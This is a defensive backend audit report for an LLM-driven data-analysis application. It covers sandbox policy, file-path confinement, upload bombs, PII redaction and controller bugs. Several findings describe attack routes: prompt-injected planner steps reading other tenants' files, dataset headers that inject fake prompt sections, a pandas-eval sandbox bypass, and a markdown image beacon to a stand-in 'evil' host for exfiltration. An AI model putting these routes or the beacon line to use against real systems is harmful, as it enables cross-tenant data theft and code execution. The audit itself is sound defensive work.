# Backend audit — 2026-10-04

Scope: `src/`, `main.py`, `scripts/`, `Dockerfile`, `docker/`, dependency files, CI, and the server-side parts of `app.py` / `ui/run.py`. Frontend (`ui/`, `static/`) excluded.
Method: six parallel read-only auditors (sandbox, LLM/prompt layer, controller, I/O, analysis tools, infra/hosting). Every High finding below was then re-checked by the lead against the cited lines. Auditor IDs (S-, L-, C-, I-, T-, F-) are kept so the detail can be traced.

Labels: **CONFIRMED** = lead re-read the code and it holds. **TRACED** = auditor traced it, lead did not re-read. **PLAUSIBLE** = chain not fully confirmed. **KNOWN** = already in `docs/IMPROVEMENTS.md`.

---

## 1. Executive summary

- **Static gates are clean:** `ruff check .` passes; `mypy src/` passes (102 files). Tests were not run (see §8).
- **No Critical issue on the default local configuration.** The architecture is sound: layered sandbox, HMAC-signed models, per-run output dirs in the app, HTML escaping, per-call hosted defaults. The auditors found many things done right (§7).
- **The risk concentrates in the hosted multi-user case** (`DSA_HOSTED=true`), where five things combine badly:
  1. a planner/LLM-controlled `file_path` is never confined (cross-tenant file read primitive);
  2. `.gz`/`.zip` uploads and related-table uploads bypass bomb checks and can OOM the shared Streamlit process;
  3. `app.py` never loads `.env`, so `DSA_HOSTED=true` in `.env` silently does nothing;
  4. two prompt paths send unsanitised / PII text to the LLM, contradicting the `REDACT_PII` contract;
  5. hosted audit logs live in the per-run temp dir and are deleted on reset.
- **Correctness:** two controller defects make features look like they work when they don't (the "complete before any tool ran" guard is dead; the deliverable-contract audit inspects data that doesn't exist yet). Two tool defects: binary targets are announced as "count variables" in the report (wrong claim), and Cliff's delta can run the process out of memory on large groups (crash).
- **AGENTS.md compliance:** 10 of 11 mechanically checked rules pass. One fails: chart design calls the LLM directly, bypassing `RLMEngine.invoke()` (C-9/L-13).

Counts (de-duplicated): 0 Critical, 12 High (H-1 … H-12), ~40 Medium, ~45 Low/Info.

---

## 2. Top priorities (do these first)

| # | Fix | Why | Effort |
|---|-----|-----|--------|
| 1 | Confine every step's `file_path` to the loaded dataset / cleaned file / registered derived path, for **all** tools incl. `clean_data` and code tools | H-1 | S |
| 2 | Cap decompression in `io._decompress` and run `validate_upload` on `.gz`/`.zip` and on related uploads | H-2, H-3 | S |
| 3 | `load_dotenv()` in `app.py` before `_HOSTED`; make `app.py` fail closed when hosted-looking | H-4 | XS |
| 4 | Pass `_hypotheses_block`, interrupt block, chart-design samples through `_sp`/`_redact`/`col.pii` | H-7, H-8 | S |
| 5 | Add `eval`, `query`, `pipe` to `_BLOCKED_ATTRS`; deny `ctypes.call_function`; add escape-regression tests | H-5 | S |
| 6 | Fix the dead completion guard (`controller.py:933`) and move the contract audit after the dashboard | H-9, H-10 | S |
| 7 | One shared `env_bool()`/`env_int()` that rejects unknown values; kill switch should be allowlist-parsed | F-3 | S |
| 8 | Rich `markup=False` / `escape()` on untrusted interpolations; wrap Stage-7 post-run audits as non-fatal | L-3, C-4 | M |

---

## 2b. Potential improvements (structural)

1. **One validated settings loader** for every env var: typed, rejects unknown values, warns on unusable ones, loads `.env` once for CLI and app. Replaces the scattered `os.getenv` parsing behind F-3, F-19, C-22, L-15, H-4.
2. **`tests/conftest.py`**: autouse fixtures that scrub governance/LLM env vars, redirect `OUTPUT_DIR`/cwd to `tmp_path`, and block the network; fixes the 61 stray `output/runs/*` dirs and hermeticity gaps (F-20).
3. **Mechanise AGENTS.md** in `tests/test_architecture.py`: controller↛`src.tools` (incl. `importlib` forms), no `.execute()` outside `BaseTool.run`, LLM SDKs only in `llm_client`, LLM calls only via `RLMEngine.invoke` (would have caught C-9), and an escape-regression suite for the sandbox policy (S-8).
4. **Real dependency story:** generate the lock from `pyproject.toml` (runtime only, hashes, platform markers); split `requirements-dev.txt`; declare `duckdb`/`json_repair`; CI installs the lock, runs `pip-audit`, pins actions by SHA, adds `permissions:`/`timeout-minutes`, builds the sandbox image and runs one execution through it; add Dependabot.
5. **Per-tenant isolation in hosted mode:** tool library (or force it off), rate-limiter cooldown/limits keyed per credential, operator-owned audit-log directory keyed by `session_id`, per-visitor run throttle, traceback suppression.
6. **Run budgets:** `MAX_RUN_SECONDS` checked at the same checkpoints as `_stop_requested`; scratch-dir size cap in the sandbox poll loop; column cap and chunked/streamed parsing in `io.py`.
7. **Observability:** structured `logging` (replace ~89 `print`s), route every silent catch through `_add_degradation` (C-10), and make Stage-7 audits individually non-fatal (C-4).
8. **Maintainability:** split `_load_dataset` (~270 lines) and `_process_step_result` (~200 lines); *[RESOLVED 2026-10-09]* deleted orphans (`SharedAnalysisContext`, `relational_joiner`, dead `duckdb_engine` helpers; wired `question_routing` to deterministic fallback planner).
9. **Statistical hygiene:** scale features before linear models, BH across screened (not just chosen) terms, significance gates on basket/segment/equity/geospatial findings, and make fragility checks test the finding's own statistic.

---

## 3. Findings — security and governance

### High

**H-1 · Planner-supplied `file_path` is never confined** — S-1 / C-1 / I-6 · CONFIRMED
`src/tools/base.py:200-203`:
```python
cleaned = memory.get_context("cleaned_file_path")
if cleaned and "file_path" in params and _needs_cleaned_redirect(params["file_path"], memory):
    params["file_path"] = cleaned
```
The comment at `base.py:62-66` states the intent ("an arbitrary existing path from the planner would otherwise let a tool read any file on disk"), but the guard only runs once `cleaned_file_path` exists, and not at all for tools with `uses_cleaned_file = False` (`clean_data`, `ingest_dataset`, `data_processing.py:195,321`). `_resolve_file_path` (`controller_steps.py:130-150`) only fills empty values; `step_validation.py` does not check `file_path`. For code tools the worker calls `read_any(dataset_ref)` before the audit hook is enabled, and the Docker backend copies the host file into scratch.
Scenario: a prompt-injected plan emits `clean_data(file_path=<other tenant's upload>)` or a first-step `execute_dynamic_code` with an arbitrary path. The file is parsed (any `read_any` format), its stats/rows reach the next LLM prompt and the report, and `cleaned_file_path` is repointed so every later tool analyses it. Conditional on planner injection; in hosted mode it is a cross-tenant read.
Fix: in `_resolve_file_path`, force `file_path` to the dataset path, the cleaned path, or a registered derived path; reject anything else. Add a test.

**H-2 · `.gz` / `.zip` decompression bomb, no cap** — I-1 · CONFIRMED
`io.py:234` `gzip.decompress(raw)` and `:243` `zf.read(members[0])` have no output limit; `validate_upload` (`security.py:168-186`) only branches for `.csv/.xlsx/.xls/.parquet`, so `.gz`/`.zip` get the extension and size check only. The upload preview runs on selection (`app.py:612`). A ~10 MB gzip of zeros expands to ~10 GB and, with the ~5× text copies in `_read_delimited`, OOM-kills the shared Streamlit process (all sessions). `tests/test_decompression_safety.py` covers only xlsx/parquet.
Fix: stream-decompress with a hard cap (`zlib.decompressobj`, `ZipInfo.file_size`), reject multi-member/nested archives, validate in `validate_upload`.

**H-3 · Related-table uploads skip `validate_upload`** — I-2 · CONFIRMED
`app.py:426-428` calls `read_any_bytes(u.getvalue(), u.name)` for every related file in `_join_review` with no extension/magic/bomb check (validation happens later, `app.py:1143`). Same bomb/parser exposure as H-2 on every rerun where the upload signature changes.
Fix: call `validate_upload` first, with the same limits. (The *primary* upload preview does validate first — `app.py:598-612` — but `validate_upload` has no `.gz`/`.zip`/`.h5` content branch, which is why H-2 and H-6 still apply to it.)

**H-4 · `DSA_HOSTED=true` in `.env` is ignored by the Streamlit app** — F-2 · CONFIRMED
`dotenv` is imported only in `main.py:17,22` (repo-wide grep for `load_dotenv`/`find_dotenv`/`dotenv_values` in `*.py`); nothing under `src/`, `ui/` or `app.py` loads it. `app.py:41` reads `DSA_HOSTED` at import. README says a `.env` is read; `.env.example` has no governance variables. An operator following the docs gets hosted mode OFF: code execution on, subprocess backend allowed, server API keys usable, safety widgets visible.
Fix: `load_dotenv()` at the top of `app.py`; add the governance variables to `.env.example`; fail closed on detected multi-user serving without the flag.

**H-5 · Sandbox static policy is bypassable via pandas expression evaluators; the runtime hook leaves ctypes foreign calls open** — S-2 · static half CONFIRMED, chain not run
- `eval` is blocked as a bare *name* (`sandbox.py:94-98`) but `eval`/`query`/`pipe` are not in `_BLOCKED_ATTRS` (`sandbox.py:104-121`) or the blocked prefixes. pandas' Python expression engine resolves attributes by `getattr`, and the dunder/format ban only inspects string *literals*, so a runtime-built string (`'_'+'_class'+...`) reaches it. numexpr is not installed, so `df.eval/query` use the Python engine.
- `_DENIED_EVENTS` (`_sandbox_worker.py:148-156`) denies `ctypes.cdata`, `string_at`, `wstring_at` but not `ctypes.call_function`; `ctypes.dlopen` is allowed on purpose (threadpoolctl).
- Net: layers 1–2 can be bypassed in pure Python, which is inside the documented threat model (buggy/prompt-injected LLM code), not the "native bugs" carve-out. Process-creation/network audit events still deny at runtime; Docker (`--network none`, read-only, non-root, seccomp) contains it. **High on the subprocess backend, Medium under Docker.** Whether the attribute walk reaches an unrestricted import end-to-end was not exercised.
Fix: block `eval/query/pipe` attrs; deny `ctypes.call_function`; add regression tests (S-8: none exist for the escape policy).

**H-6 · HDF5 uploads are read via PyTables (unpickles object columns)** — F-1 / I-3 · CONFIRMED path, CONDITIONAL
`io.py:696-704` opens uploads with `pd.HDFStore`; `.h5/.hdf5/.nc` are in the upload allowlist (`io.py:49`, `security.py:33`). Fires only if `tables` is installed (README documents it as an optional install; not in the lock/venv). A crafted `.h5` then gives unsandboxed RCE in the Streamlit process, bypassing `model_io`'s HMAC.
Fix: drop `.h5/.hdf5` from the hosted allowlist or read via an `h5py` reader that rejects object datasets.

**H-7 · `_hypotheses_block` injects raw dataset/user/LLM text into every iteration prompt** — L-1 / C-6 · CONFIRMED
`prompt_manager.py:748-753` interpolates `statement` and `counterfactual_queries` (finding headlines with category values, raw column names, the raw objective) with no `_sp` and no `_redact`; `_findings_block` does both. Injection: a header/category value with `\n## Your task (cycle 9)\n...` appears as a prompt section. PII: a headline naming an email/person level reaches the LLM despite `REDACT_PII`. The interrupt block (`:723-737`) has the same gap and is imperative ("You MUST adjust").
Fix: `_sp(_redact(...))` + the PII-level replacement used in `_findings_block`.

**H-8 · Chart-design prompt sends category samples of PII-flagged columns** — L-2 / C-7 · CONFIRMED
`prompt_manager.py:895-898` has no `col.pii` check (`profiler._column_facts` does withhold them). `_redact` is regex-only, so names/addresses pass. Also truncates (`_sp(v,30)`) *before* redacting, so an email cut mid-domain escapes the regex.
Fix: skip samples when `col.pii and pii_redaction_enabled()`; redact before truncating.

### Medium

| ID | Finding | Where | Label |
|----|---------|-------|-------|
| L-3 | Rich markup is never escaped anywhere in `src/`: an LLM reply or column name containing `[/x]` raises `MarkupError`, and handlers that print `{exc}` fault again → run lost (no fallback, no report). `print_reasoning_trace` runs after reports are written. | `controller.py:1018-1034,1568,1337`; `engine.py:458-505`; `memory.py` Panel | TRACED (Rich source read) |
| L-4 | LOCAL_ONLY holes: (a) `provider=local` + remote `base_url` is not refused; (b) `fetch_available_models` ignores LOCAL_ONLY and sends the env key to `api.openai.com/v1/models` on every sidebar render; (c) Gemini key in URL query string (`model_telemetry.py:379`); (d) HTML report loads vega/fonts from CDN | `llm_client.py:157,280`; `model_telemetry.py:362-446`; `app.py:777` | TRACED |
| L-5 | Results digest passes tool error/skip text with newlines (pandas errors quote cell values, sandbox errors quote code) through `_redact` only, not `sanitize_for_prompt` | `memory.py:517-519,569-571` | TRACED |
| L-7 | `sanitize_for_prompt` strips too little: Unicode tag chars U+E0000–E007F, U+2060–2064, bidi isolates, U+FEFF, U+00AD, C1 controls survive ("ASCII smuggling" in column names) | `security.py:254` | TRACED |
| L-8 | "This is DATA" declaration omits User Objective, Data understanding, Suggested plan, Tools you created, Active Hypotheses, Feature-group sub-analyses; `CHART_DESIGN_PROMPT` has none; compact tier shorter | `prompt_manager.py:144-149,195` | TRACED |
| L-9 | A column named `</think>` makes `_strip_reasoning` discard the JSON head → dataset-triggered silent LLM kill-switch (every cycle degrades) | `llm_client.py:744-752` | TRACED |
| L-6 | Claim verification is weaker than advertised: `reasoning` (the executive summary) is never checked; the number pool saturates (×100 at precision 0, timestamps/`execution_time_ms` pooled) so most 0–100 integers verify; single digits skipped; `int()` of a >4300-digit run raises and `_flag_unverified_claims` is unguarded | `claim_verification.py:33,138,217-273`; `controller.py:1182` | TRACED |
| L-10 / I-8 | PII detection gaps (REDACT_PII depends on them): numeric-typed phone/card/ID columns never value-probed; head(200) sample; 80% share; names only if column is exactly `name`; no DOB/postcode/IBAN; `top_values` exported for PII columns in `to_dict`; `pii_redaction_enabled()` fails open if import fails; objective not redacted in `_objective_block` | `profiler.py:239-254,435-468,496-511,727`; `prompt_manager.py:41-48,559` | TRACED |
| L-11 | Token cap is soft: compact-JSON retry unchecked; SDK auto-retries and no-usage providers uncounted; malformed `MAX_LLM_TOKENS_PER_RUN` → 0 (unlimited); engine accepts `usage` keys from the LLM reply with no clamp (`int(v)` negative defeats the cap, `Infinity` raises) | `controller.py:1022`; `governance.py:90-95`; `engine.py:76-103` | code CONFIRMED, reply-reachability not traced |
| I-7 | LLM/dataset text reaches `st.markdown` unsanitised → `![x](https://evil/?d=…)` beacon/exfil; Streamlit has no CSP | `report_generator.py:636-662`; `ui/tabs/downloads_tab.py:188-227` | TRACED |
| F-3 | Safety switches parse "off only for a known false word": `ENABLE_CODE_EXECUTION=off` leaves it ON; `DSA_HOSTED=on` leaves hosted OFF; `ENABLE_LLM`/`ENABLE_ML` require exactly `"true"`. Inconsistent conventions | `governance.py:49,55`; `sandbox.py:892`; `controller.py:141,146` | TRACED |
| F-4 | Hosted audit logs (`audit/*.jsonl`) live in the per-run temp dir and are deleted on reset/discard/24 h sweep; `llm_calls.jsonl` has no `session_id` | `app.py:1130-1133`; `ui/run.py:51` | TRACED |
| F-5 | Stale-run sweep runs once per server process (`@st.cache_resource`); closed-tab uploads (up to 200 MB) persist until restart | `app.py:204-210` | TRACED |
| F-6 | Hosted visitors see full Python tracebacks | `ui/run.py:335`; `app.py:271,1064` | TRACED |
| F-7 / C-8 | CLI always exports `OUTPUT_DIR` (`main.py:174`), so the controller takes the env branch (`controller.py:179`) and never uses `output/runs/<session_id>`; concurrent CLI runs share `models/`, `reports/`, `audit/`; `.env.example` also sets `OUTPUT_DIR=output`. `output/latest.txt` is written but never read | `main.py:83-87,174`; `controller.py:168-190` | CONFIRMED |
| F-8 / S-5 | `ENABLE_TOOL_LIBRARY` is one global library; tool descriptions are not sanitised (L-14) and enter the *system* prompt; nothing forces it off when hosted → cross-tenant poisoning. `_load_valid_spec` re-checks code only, not name/schema (S-10); writes non-atomic | `tool_factory.py:219-367`; `controller.py:745-769` | TRACED (default off) |
| S-3 | Subprocess memory cap is polled every 0.2 s (and no rlimit on Windows): one large native allocation can exhaust host RAM before the kill | `sandbox.py:585-603` | TRACED (partly KNOWN) |
| S-4 / F-11 | `duckdb` missing from `pyproject.toml` and `requirements.lock`; `dsa.query_sql` then falls back to Polars with a regex-only denylist; the Docker sandbox image installs neither duckdb nor polars, so `query_sql` is broken on the backend hosted mode mandates | `duckdb_engine.py:34-54,165-178`; `sandbox_toolkit.py:896-904` | TRACED (Polars risk KNOWN) |
| I-4 | Row cap applied after a full load and wide→long melt; ~5× file-size text copies; no column cap; parquet bomb check trusts the file's own footer; xlsx check allows 500 MB uncompressed | `io.py:285,457-499,795-885`; `security.py:229` | TRACED |
| I-9 | Many-to-many join on a user-overridden key skips the growth gate (`strict=False`) and materialises the full product before sampling → OOM | `joins.py:70-98,146-156`; `app.py:462` | TRACED |
| I-10 | `generate_report` `dataset_name` is an unpinned filename join (`../../x_report.md` writes outside the run dir; fixed suffix, report content) | `report_generator.py:536,711-714` | TRACED |
| F-12 / F-13 | The hosted-mandated Docker path has no real tests (`DockerSandbox.execute`, `_seccomp_args` untested; CI never builds the image); scratch dir is 0700 host-owned while container runs uid 1000 with no `--user` mapping → every hosted run may fail on a Linux host with another uid | `sandbox.py:765-821`; `tests/test_sandbox.py:264` | TRACED / PLAUSIBLE |
| F-9 / F-10 | Dependency declarations disagree (pyproject caps `psutil<6`, `rich<14`, `polars<1`, `xgboost<3`, `openai<2`; lock has 7.2.2 / 15.0.0 / 1.40.1 / 3.2.0 / 2.36.0); `requirements.txt` has no upper bounds and is what CI installs; the "lock" is a `pip freeze` superset (has `pywin32` with no marker, arize-phoenix, boto3, fastapi, ldap3, …, no hashes, no duckdb) and nothing consumes it | `pyproject.toml`; `requirements.*` | TRACED |

### Low / Info (security)

- S-6 scratch-dir writes unbounded while worker runs; S-7 sandbox read roots include the whole interpreter prefix + `src/`; S-9 no size cap on `extra_globals`/`example_params`.
- L-12 rate limiter keyed per `(provider, model)`, not per credential — one visitor's 429 cooldown (≤60 s) and a permanent `rpm_limit` overwrite affect others; retries skip `acquire()`; HTTP-date `Retry-After` mis-parsed. F-14 same.
- L-15 `RecursionError` from deep JSON not caught in `_parse_json`; NVIDIA stream has no overall wall-clock limit; bare `int()/float()` on env values crashes at startup (F-19, C-22).
- L-16 audit `error[:500]` can carry provider-echoed prompt fragments; local-server error prints `user:pass@` in the base URL; stage label is a shared mutable.
- F-15 hosted mode relies on UI gating to keep the server API key out (`llm_client.py:155` falls back to env).
- F-16 CI: no `permissions:` block, tag-pinned actions, no `timeout-minutes`, no dependency audit, no Dependabot; matrix skips 3.12; `mypy` excludes `app.py`, `ui/`, `main.py`, `scripts/`.
- F-17 Dockerfile: mutable base tag, no `--require-hashes`, `dsa-sandbox:latest` never checked for existence/staleness.
- F-18 `.gitignore` covers `.env` only (`.env.local`, `.env.production`, `.streamlit/secrets.toml`, `*.key` not ignored); `.claude/settings.local.json` tracked; `three.module.js` (1.3 MB) tracked twice; no secrets found in tracked files.
- F-22 no per-visitor throttle (`MAX_CONCURRENT_RUNS` is process-wide; code/token budgets are per run, not per user).
- I-11 `model_io`: no key length check, creation race on first concurrent save, non-atomic pickle+sig writes, signature doesn't bind the filename; `.model_key` and `.sig` offered as "Trained model" downloads (I-18). I-12 CSV formula escaping skips headers (`outliers_flagged.csv`). I-13 `pyarrow>=14` admits CVE-2023-47248 (fixed 14.0.1; lock pins 24.0.0). I-14 dead f-string SQL helpers in `duckdb_engine`. I-15 unclosed `pd.ExcelFile`; sparse-dimension xlsx. I-16 non-`DatasetReadError` exceptions escape. I-17 `nul.x` bypasses the reserved-name check.

---

## 4. Findings — correctness and orchestration

### High

**H-9 · The "complete before any tool ran" guard can never fire** — C-2 · CONFIRMED
`controller.py:620` appends the `ingest_dataset` result to `tool_results`, so `any(r.tool_name != "planner" ...)` at `:933-935` is always true. `MIN_ITERATIONS` defaults to 1, so a model replying `{"status":"complete"}` on cycle 1 ends the run with zero analysis tools and LLM-invented insights. No test covers it. (`_handle_completion`, `controller.py:1065-1069`, was re-read: with `iteration >= min_iterations` it accepts the reply and ends the loop.)
Fix: exclude `ingest_dataset` (or count non-ingest, non-planner results).

**H-10 · Deliverable-contract audit checks data that does not exist at audit time** — C-3 · CONFIRMED
`_audit_contract` runs at `controller.py:1203`; the dashboard is built at `:1330`; charts live in `self._last_charts`. `final_result["charts"]` is read/written only inside `deliverable_contract.py:159,239` — nothing populates it and no renderer reads it. Every requested chart is therefore "missing" or "repaired" with a synthetic chart no one renders; `final_result["findings"]` holds dicts but the audit uses `getattr(f, "headline"/"kind")`. Unit tests pass because they hand-build the shape. The UI shows "repaired/delivered" for things the dashboard never contains.
Fix: audit after `_generate_dashboard` against `_last_charts` and real findings.

**H-11 · A binary/integer target is announced as a "count variable"** — T-2 · core CONFIRMED, trigger path not re-traced
`stats_utils.count_target_diagnostics` (`:381-402`) only requires non-negative integers with n ≥ 10; the auditor traced `variable_scale_analysis` auto-filling the target. A 0/1 `churn` yields "Target 'churn' is a count variable: recommended model is 'poisson'" (importance 0.75) in the report.
Fix: require ≥3 distinct values / profile-marked count; exclude flag targets.

**H-12 · Cliff's delta allocates an n_x × n_y matrix** — T-1 · CONFIRMED
`stats_utils.py:336` `diff = vx[:, None] - vy[None, :]`: 50k × 50k float64 ≈ 20 GB (called per numeric column from `variable_methods.py:330`). Fix: use the rank-sum identity `delta = 2U/(nm) − 1`.

### Medium

| ID | Finding | Where |
|----|---------|-------|
| C-4 | Stage-7 post-run steps (`_attach_run_metadata`, `_flag_unverified_claims`, `_audit_contract`, causal-language audit, `attach_finding_checks`) are unguarded; one exception discards the run after all LLM/tool spend → no report (breaks success criterion #5) | `controller.py:1182-1332` |
| C-5 | One try-block treats domain-pack/integrity failure as a profile failure then hides it: re-profile overwrites `degradations`; `except Exception: pass` at `:647` | `controller.py:451-526,638-648` |
| C-9 / L-13 | **AGENTS.md rule FAIL:** `_design_charts` calls `self.llm_client.call(...)` directly and patches usage by hand — absent from the trace/call count, skips depth guard | `controller_report.py:123-133` |
| C-10 | ~12 silent degradations never reach `degradations` (domain inference, `tool.findings()`, run-level FDR, dependence/leakage/fragility audits, dashboard/HTML/summary, mid-run LLM failures, `target_hint` typo silently auto-detects another target). `target_leakage_alerts: []` is indistinguishable from "none found" | `controller.py:462,1175-1286`; `controller_steps.py:218,270`; `controller_report.py:68-208` |
| C-11 | Retry budget keyed per tool name for the whole run (two bad-column plans disable `select_statistical_test` for the run); an all-skipped/refused cycle is not "no progress" → up to `max_iterations` wasted LLM calls | `controller_steps.py:53-65,340-410` |
| C-8 | No wall-clock budget anywhere (`MAX_RUN_SECONDS` absent); a slow built-in tool is uninterruptible and holds a hosted run slot indefinitely | `controller*.py` |
| C-12 / C-13 | Integrity "flatline" fires on any numeric column with ≥10 identical consecutive values (binary flags, ratings, `quantity=1`) with a pure-Python loop; constraint-violation findings are dropped as "trivial" (`effect = 1 − support < 0.01 < 0.02`) and `importance=0.8` is overwritten | `integrity.py:296-367`; `findings.py:24,256-264` |
| C-14 / T-16 | A NaN/None p-value poisons the report-time BH family (`apply_benjamini_hochberg` unguarded) → no report or everything "not significant"; two inconsistent BH families (C-15) | `multiple_testing.py:36`; `html_report.py:759` |
| T-3 | Linear models fitted on unscaled features (no `StandardScaler` anywhere in `ml_pipeline.py`) — L2 is met in letter, not effect; coefficients/driver ranking are scale artefacts | `ml_pipeline.py:298-340,1125` |
| T-4 / T-17 / T-19 | `roc_auc_score` on a single-class test split kills every classifier with an opaque "No models could be trained"; `n_cv_folds` not clamped to the AGENTS k≥5 rule and `test_size` unvalidated; singleton-class stratified split raises generic ValueError instead of `ToolExecutionError` | `ml_pipeline.py:1275`; `ml_common.py:136,185,189` |
| T-5 | `evaluate_model` never learns the trained task type (defaults to "classification"); a regression model gets label-encoded target + `accuracy_score` | `ml_evaluate.py:206`; `controller_steps.py:346-361` |
| T-6 | Post-selection inference: p-values/CIs reported after selecting top columns on the same data; BH over ≤8 chosen terms, not the screened set | `regression.py:404`; `mixed_model.py:175-209` |
| T-7…T-15 | `graph_analysis` weight/edge length mismatch crash; geospatial "hotspot" fires on uniform random points; basket rules ranked by lift with no significance; Mann-Kendall ignores autocorrelation; digit-heaping and Benford flag ordinary small-integer / bounded `price` columns; fragility audit doesn't test the finding's own effect (nearly all "robust"); `segment_comparison` summary has no significance wording and uses z-test with min cell 5; four-fifths flag with no sample-size gate | see auditor detail |

### Low / Info (correctness)

- T-18 partial model failures hidden (`build_errors` only surfaced if all fail); clustering mode runs on unscaled ordinal features with "CV mean=N/A". T-20 unbounded one-hot width. T-21 survival milestones extrapolated past a group's last observation; rows with `duration ≤ 0` dropped. T-22 experiment entity aggregation always `mean`. T-23–T-27 financial/workforce/time-series/forecast/mixed-model heuristics presented as results (95% interval = random-walk shape; backtest MASE is min over 7 models on same holdout). T-25 causal wording guard misses elasticity/regression/survival phrasing. T-28 `detect_target_leakage` flags every `*_date`/`*_reason` column. T-31 tuned `cv_mean` is selection-biased.
- C-16 *[RESOLVED 2026-10-09]* `SharedAnalysisContext` deleted, eliminating raw DataFrame memory pinning. C-17 an LLM reply with `"deterministic": true` lifts the step cap. C-18 UI callbacks unguarded. C-19 hypothesis tree decorative (every finding "supported", oldest 6 shown). C-20 `_run_batch` drops computed concurrent results on interrupt; `step_number` collisions. C-21 profile vs tools coerce with different delimiter settings (`12,500` → 12.5 vs 12500). C-22 `load_dataset(interactive=True)` default calls `input()`; `memory.save()` non-atomic.
- I-5 silent data-corruption cluster: `read_csv` without `dtype=str` loses leading zeros/long IDs; 3-decimal European commas read 1000× too large; rows with a cell `All`/`Total` dropped; trailing rows starting `Note…` trimmed; auto wide→long melt on `Q1…Qn`/`T1…T3`; mixed-timezone parse may raise.
- Layer drift: `memory.py:25` imports `profiler.ground_objective_column` (AGENTS table allows stdlib/rich/findings); `controller.py` is 1593 lines with ~40 back-compat re-exports and several dead methods; tool-to-tool imports exist (regression→experiment_analysis, clustering→ml_pipeline, anomaly→time_series). Several tools seed with 0 rather than 42 (still deterministic); XGBoost switches to CUDA when `nvidia-smi` succeeds (host-dependent results).

---

## 5. AGENTS.md rule check (controller auditor)

| Rule | Result |
|------|--------|
| Controller never imports `src/tools` | PASS (not mechanically enforced; `agenda.py:388` uses `importlib`) |
| Controller never calls `BaseTool.execute()` | PASS (`sandbox_toolkit.py:564` calls it, outside the controller) |
| No LLM SDK use outside `llm_client` / engine | PASS (`model_telemetry` uses raw `urllib` for model discovery) |
| **Never call the LLM except via `RLMEngine.invoke()`** | **FAIL** — `controller_report.py:123` |
| `engine.py` doesn't import memory/tools/controller | PASS (enforced by `tests/test_architecture.py`) |
| `cleaned_file_path` set after `clean_data` success | PASS (`controller_steps.py:384-387`) |
| No raw rows/DataFrames in prompts | PASS (hygiene gaps are H-7/H-8, L-5) |
| No hardcoded secrets | PASS |
| No large datasets/`.env` committed | PASS |
| Per-controller registry / no shared mutable class state | PASS |
| Nothing unpickled in `memory.py` | PASS |
| `ruff check .` / `mypy src/` | PASS (run by lead) |
| Tool contract (`summary` key, `ToolExecutionError`, seeding, tests) | Mostly PASS; partial FAIL on `ToolExecutionError` for sklearn split errors, graph weight mismatch, MemoryError; silent swallows at `ml_pipeline.py:1025,1059`, `ml_evaluate.py:577`, `time_series.py:736,795`, `stats_utils.py:355`; **no tests**: `dimensionality_analysis`, `geospatial_analysis`; only pipeline-level coverage: cohort, concentration, financial, segment_comparison, text, workforce |
| ML anti-overfitting contract | PARTIAL: strategy selection, `cv_mean` ranking, `train_test_gap`, `overfit_warnings`, `max_depth=6` PASS; k≥5 not enforced (T-17); L2 weakened by missing scaling (T-3) |

`tests/test_architecture.py` has only three tests (tools↛engine/controller, engine↛memory/tools/controller, memory↛tools/engine/controller). Nothing enforces controller↛tools, `.execute()` calls, or SDK confinement. `HANDOVER.md` was created on 2026-10-09 to guide the next session on analytical depth improvements.

---

## 6. Test gaps (highest risk first)

| Module | Status |
|--------|--------|
| Sandbox escape policy (`_BLOCKED_ATTRS`, `_`-attr ban, format-field ban, audit-hook denials, out-of-scratch `open`, `dsa.run` param rejection) | **none** (S-8) |
| `DockerSandbox.execute`, `_seccomp_args` | **none** (one `isinstance(avail, bool)` test); CI never builds the image |
| `llm_client.py` | no dedicated file; `LOCAL_ONLY`, `REDACT_PII`, `MAX_LLM_TOKENS_PER_RUN`, `_hypotheses_block` have **zero** tests |
| `governance.py` | thin (4): no budget-enforcement, token-cap, or audit-write-failure test |
| `io.py` HDF5 / `.gz` / `.zip` paths | none |
| `model_io.py` | thin (4): no key-race or permission test |
| `step_validation.py`, `analysis_io.py`, `sentinels.py`, `multiple_testing.py`, `claim_verification.py` | indirect only |
| `controller.py` completion guard (H-9) and contract audit against real data (H-10) | none |
| `tool_factory` library/hosted isolation, tampered-name case | none |
| `main.py` `--output-dir` default (F-7) | none |
| `dimensionality_analysis`, `geospatial_analysis` | no execution test |
| `duckdb_engine` Polars fallback | not tested |

Test hygiene (F-20): no `conftest.py` (no env scrubbing, network block, or output redirect); several tests build `AgentController()` before isolating `_output_dir` (61 run dirs exist locally); wall-clock assertions (`test_rlm_engine.py:93` `< 0.20 s`; others 6–8 s) can flake; `pytest-asyncio` declared but unused.

---

## 7. Checked and solid (so you know what was covered)

- Sandbox: env is a true allowlist; whole process tree killed on timeout; result file has uuid name; no Docker→subprocess fallback when `SANDBOX_REQUIRE_ISOLATION` (tested); kill switch applied in registry, plan parsing, and step prep; `MAX_CODE_EXECUTIONS` has no race; every execution/refusal audited via `json.dumps` (no log injection); Docker flags (`--network none`, `--read-only`, `--cap-drop ALL`, `no-new-privileges`, pids/mem/CPU, seccomp default-deny with 196 syscalls); `dsa.run` rejects `file_path`/`output_dir`/`_` params; `dsa.derive` AST whitelist; DuckDB locked (`enable_external_access=false`, `lock_configuration=true`).
- Models: HMAC-SHA256 with `compare_digest`, 32-byte random key via `secrets`, no unsigned load path; a repo-wide sweep found no `joblib.load`, `dill`, `yaml.load`, `eval`, `numpy.load(allow_pickle)` or `read_pickle`.
- HTML report: every dataset/LLM string escaped; `</` neutralised in embedded JSON; Vega spec sanitiser rejects `url`/`expr`/`signal`/etc. Planner `output_dir` is pinned under the run root via `resolve_output_path`.
- Hosted: defaults read at call time (not import); per-run `mkdtemp`; objective in a `ContextVar`; session ids are `time-uuid4`, never user-supplied; no key in `os.environ` when hosted; stale-dir sweep is prefix/parent/symlink/age guarded.
- LLM: keys only from `RunConfig`/env, `repr=False`, never in audit entries; engine REPL is a dict store (no code executed), depth-bounded; Retry-After max 60 s; redaction/JSON regexes have no ReDoS.
- ML: preprocessing sits inside the sklearn `Pipeline` (no CV leakage); time-series and panel splits correct; `evaluate_model` reproduces train's split exactly; survival KM/log-rank formulas correct; no pandas-3 `dtype == object` traps; all random ops seeded.
- No secrets in tracked files; `.env` untracked and never in history; `.dockerignore` excludes `.env`, `data`, `output`, `tests`.

---

## 8. Not covered / limits of this audit

- **No tests, app runs, Docker runs, or network calls were executed** (project rule: no testing until asked). Every label above means "read in code", not "observed at runtime". Sandbox findings were not exercised with live escape attempts; H-5's full chain is unproven.
- **Frontend** (`ui/`, `static/`) excluded except `ui/run.py`, the downloads tab, and `app.py` server-side logic. Reverse proxy / TLS / Streamlit XSRF and CORS settings are outside the repo.
